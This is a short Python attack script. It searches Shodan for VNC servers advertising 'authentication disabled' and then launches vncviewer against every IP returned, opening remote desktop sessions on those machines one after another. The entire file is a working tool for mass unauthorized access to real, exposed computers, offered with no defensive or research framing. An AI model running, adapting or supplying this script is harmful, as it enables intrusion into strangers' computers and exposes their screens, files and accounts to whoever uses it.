
#Made by @01mi773r
#VERSION 1 MAY 18 2020

#insert your shodan api key below
your_shodan_api = ''


import shodan
import os
from termcolor import colored
os.system('clear')
def vncviewerr(x):
	try:
		connect = os.system('vncviewer {}'.format(x))
	except:
		print(colored('Failed Connecting! Trying next IP', 'green'))
		pass
#SHODAN SEARCH
search_wordss = ('"RFB 003.006" "authentication disabled"')
api = shodan.Shodan(your_shodan_api)

try:
        # Search Shodan
	results = api.search("{}".format(search_wordss))

        # Show the results and pass the ips to vncviewrr(x) so it connects to the ip
	for result in results['matches']:
		os.system('clear')
		print(colored('[#] Connecting to the next computer, if it takes too long press - Ctrl + C', 'red'))
		print("IP: {}".format(result['ip_str']))
		print(colored(result['data'], 'blue'))	
		vncviewerr(result['ip_str'])
except shodan.APIError as e:
		print('Error: {}'.format(e))
